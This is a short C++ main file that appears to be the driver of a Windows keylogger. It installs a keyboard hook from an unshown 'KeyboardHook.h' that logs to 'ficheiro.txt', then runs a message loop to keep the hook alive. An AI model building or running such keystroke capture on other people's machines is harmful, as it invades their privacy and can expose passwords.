#define WIN32_LEAN_AND_MEAN

#include "KeyboardHook.h"

int main(){

    std::string kappa = "ficheiro.txt";

    SetHook(kappa);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

}